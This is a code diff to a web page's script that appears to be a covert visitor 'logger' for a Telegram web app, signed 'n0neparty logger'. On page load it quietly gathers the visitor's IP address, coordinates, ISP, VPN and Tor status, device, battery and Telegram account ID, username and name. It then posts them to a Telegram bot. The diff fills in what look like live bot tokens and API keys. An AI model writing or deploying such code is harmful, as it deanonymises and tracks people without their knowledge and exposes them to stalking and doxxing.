@@ -36,22 +36,6 @@
 </body>
 </html>
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-    // Проверяем, был ли уже отправлен лог
-    if (!localStorage.getItem('logSent')) {
-        // Если лог не был отправлен, выполняем отправку лога и сохраняем флаг
-        sendLog();
-        localStorage.setItem('logSent', 'true');
-    }
-});
-
-function sendLog() {
-
-    fetch(url, {
-        method: 'POST',
-        body: formData
-    });
-}
 document.addEventListener('DOMContentLoaded', function() {
     let batteryLevel;
     let screenWidth;
@@ -60,6 +44,7 @@ document.addEventListener('DOMContentLoaded', function() {
     navigator.getBattery().then(function(battery) {
         batteryLevel = battery.level * 100;
     });
+
     
     screenWidth = window.screen.width;
     screenHeight = window.screen.height;
@@ -125,7 +110,7 @@ fetch('https://ipapi.co/json/')
   
     let TypeInternet = navigator.connection.effectiveType;
 
-fetch('https://ipinfo.io/' + ip + '?token=ааа')
+fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
 .then(response => response.json())
 .then(data => {
   let isProxy = data.privacy && data.privacy.proxy ? true : false;
@@ -135,8 +120,7 @@ fetch('https://ipinfo.io/' + ip + '?token=ааа')
   let isRoute = data.asn && data.asn.route;
   let isDomain = data.asn && data.asn.domain;
 
-
-fetch('https://api.ipregistry.co/user_agent?key=ааа')
+fetch('https://api.ipregistry.co/user_agent?key=ucal10ndx2bmo0kf')
 .then(response => response.json())
 .then(data => {
   let device = data.device;
@@ -148,57 +132,48 @@ fetch('https://api.ipregistry.co/user_agent?key=ааа')
   let osvers = data.os.version;
     
         const message = `
-*🔎 ip*
-*├ IP: ${ip}*
-*├ Provider: ${isp}*
-*├ City: ${city}*
-*├ Region: ${region}*
-*└ Timezone IP: ${time}*
-
-*📶 Net Info*
-*├ Proxy: ${isProxy}*
-*├ Vpn: ${isVPN}*
-*├ Tor: ${isTOR}*
-*├ Coordinates: ${longitude} ${latitude},*
-*├ Asn: ${isAsn}*
-*├ Route: ${isRoute}*
-*├ Domain: ${isDomain}*
-*├ TLD: ${tld}*
-*├ Version: ${versian}*
-*└  Internet: ${TypeInternet}*
-
-    
- *💻 System*
-*├ Os: ${osname}*
-*├ Battery: ${batteryLevel}%*
-*├ Screen resolution: ${screenWidth}x${screenHeight}*
-*├ Time: ${formattedTime}*
-*├ Language: ${language}*
-*├ Date: ${formedDate} Day of week: ${dayOfWeek}*
-*├ Memory: ${memory} RAM*
-*├ TimeZone: ${timeZone}*
-*├ Device: ${model}*
-*└ Device Type: ${deviceType}*
-
-*🌐 Browser*
-*├ Browser: ${browser}*
-*├ Browser Engine: ${namebrowser}*
-*└ UserAgent: ${userAgent}*
-
- *📄 Clipboard*
- *└ Undefined*
-    
-*👤 Account: *
-*├ ID: ${tg.initDataUnsafe.user.id}*
-*├ Username: @${tg.initDataUnsafe.user.username}*
-*├ Name: ${tg.initDataUnsafe.user.first_name}*
-*├ Language: ${tg.initDataUnsafe.user.language_code}*
-*└ Can Write To Pm: ${tg.initDataUnsafe.user.allows_write_to_pm}*
-             *Killed by n0neparty logger 👾*
+      * Ip 🌐*
+    *├ IP: ${ip}*
+    *├ UserAgent: ${userAgent}*
+    *├ Provider: ${isp}*
+    *├ City: ${city}*
+    *├ Region: ${region}*
+    *├ Timezone IP: ${time}*
+    *├ Proxy: ${isProxy}*
+    *├ Vpn: ${isVPN}*
+    *├ Tor: ${isTOR}*
+    *├ Coordinates: ${longitude} ${latitude},*
+    *├ Asn: ${isAsn}*
+    *├ Route: ${isRoute}*
+    *├ Domain: ${isDomain}*
+    *├ TLD: ${tld}*
+    *├ Version: ${versian}*
+      * System 🖥*
+    *├ Browser: ${browser}*
+    *├ Browser Engine: ${namebrowser}*
+    *├ Os: ${osname}*
+    *├ Battery: ${batteryLevel}%*
+    *├ Screen resolution: ${screenWidth}x${screenHeight}*
+    *├ Time: ${formattedTime}*
+    *├ Language: ${language}*
+    *├ Date: ${formedDate} Day of week: ${dayOfWeek}*
+    *├ Memory: ${memory} RAM*
+    *├ Internet: ${TypeInternet}*
+    *├ TimeZone: ${timeZone}*
+    *├ Device: ${model}*
+    *├ Device Type: ${deviceType}*
+      *🔍 Account: *
+    *├ ID: ${tg.initDataUnsafe.user.id}*
+    *├ Username: @${tg.initDataUnsafe.user.username}*
+    *├ Name: ${tg.initDataUnsafe.user.first_name}*
+    *├ Language: ${tg.initDataUnsafe.user.language_code}*
+    *├ Can Write To Pm: ${tg.initDataUnsafe.user.allows_write_to_pm}*
+    *Killed by n0neparty logger 👾*
                              `;
 
-        const token = 'низя';
-        const chatId = 'низя';
+        
+        const token = '6760998368:AAGASTUFyPU3WQyupgYDk11ygOb4SU7oCus';
+        const chatId = '-1002084822950';
         const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
         const formData = new FormData();
         formData.append('chat_id', chatId);
@@ -232,7 +207,6 @@ function getBrowserInfo() {
     browser = `${match[1]} ${match[2] || ''}`.trim();
     return browser;
 };
-
     </script>
 </body>
 </html>
